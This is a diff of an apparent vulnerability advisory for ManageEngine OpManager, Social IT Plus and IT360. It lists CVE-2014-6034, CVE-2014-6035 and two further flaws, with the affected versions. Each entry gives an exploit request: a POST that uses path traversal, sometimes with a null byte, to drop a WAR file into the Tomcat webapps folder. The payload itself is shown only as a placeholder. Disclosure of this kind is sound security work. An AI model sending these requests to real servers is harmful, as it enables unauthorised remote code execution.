@@ -19,12 +19,15 @@ Constraints: unauthenticated on OpManager and Social IT; authenticated in IT360
 a)
 CVE-2014-6034
 POST /servlet/com.me.opmanager.extranet.remote.communication.fw.fe.FileCollector?regionID=../../../tomcat/webapps&FILENAME=payload.war
+<... WAR file payload ...>
 Affected versions: OpManager v8.8 to v11.4; Social IT Plus v11.0; IT360 v? to v10.4
 A Metasploit module that exploits this vulnerability has been released.
 
 b)
 CVE-2014-6035
 POST /servlets/FileCollector?AGENTKEY=123&FILENAME=../../../tomcat/webapps/warfile.war
+<... WAR file payload ...>
+
 Affected versions: OpManager v? to v11.4
 
 
@@ -44,10 +47,14 @@ Constraints: no authentication needed for OpManager and Social IT; authenticated
 
 a)
 POST /servlet/MigrateLEEData?fileName=../tomcat/webapps/warfile.war%00
+<... WAR file payload ...>
+
 Affected versions: Unknown, at least OpManager v8 build 88XX to 11.4; IT360 10.3/10.4; Social IT 11.0
 
 b)
 POST /servlet/MigrateCentralData?operation=downloadFileFromProbe&zipFileName=../tomcat/webapps/warfile.war%00
+<... WAR file payload ...>
+
 Affected versions: Unknown, at least OpManager v8 build 88XX to 11.4; IT360 10.3/10.4; Social IT 11.0
 
 
